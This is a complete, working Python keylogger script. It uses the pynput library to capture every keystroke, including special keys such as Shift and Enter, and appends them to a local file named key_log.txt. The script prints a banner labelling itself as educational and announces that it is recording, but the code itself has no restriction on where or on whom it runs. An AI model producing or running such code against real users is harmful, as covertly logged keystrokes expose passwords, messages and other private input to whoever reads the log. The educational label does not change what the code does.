from pynput.keyboard import Listener

# The file where keystrokes will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        # If it's a normal character (letters, numbers), write it normally
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # If it's a special key (Space, Enter, Shift, etc.), format it
        with open(log_file, "a") as f:
            if str(key) == "Key.space":
                f.write(" ")
            elif str(key) == "Key.enter":
                f.write("\n")
            else:
                f.write(f" [{str(key)}] ")

def main():
    print("--- Simple Keylogger ---")
    print("[!] STRICTLY FOR EDUCATIONAL PURPOSES")
    print(f"[*] Keystrokes are being recorded in the '{log_file}' file.")
    print("[*] Press Ctrl+C in this window to stop the program.")
    
    # Start listening to the keyboard
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()